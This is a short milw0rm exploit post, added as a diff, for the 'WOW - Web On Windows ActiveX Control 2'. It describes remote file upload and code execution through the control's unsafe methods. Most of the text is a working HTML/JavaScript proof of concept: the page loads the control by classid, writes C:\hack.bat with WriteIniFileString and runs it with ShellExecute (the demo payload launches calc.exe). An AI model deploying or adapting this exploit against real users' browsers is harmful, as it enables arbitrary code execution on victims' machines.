@@ -1,0 +1,22 @@
+Written By Michael Brooks
+Special thanks to str0ke!
+
+software:WOW - Web On Windows ActiveX Control 2  - Remote Code Execution
+exploit type: Remote File Upload and Remote Code Execution
+Download: http://www.download.com/WOW-Web-On-Windows-ActiveX-Control/3000-2206_4-10049976.html
+183,682  downloads at the time of publishing this exploit.
+
+This entire dll is full of bad functions,  including read write access
+to the registry.
+This must have been accidentally registered to IE's ActiveX interface.
+
+<html>
+<object classid="clsid:441E9D47-9F52-11D6-9672-0080C88B3613" id="obj">
+	</object>
+</html>
+	<script>
+	obj.WriteIniFileString("C:\\hack.bat","","calc.exe ","");
+	obj.ShellExecute(0,"open","hack.bat",0,"C:\\",0);
+</script>
+
+# milw0rm.com [2009-01-29]
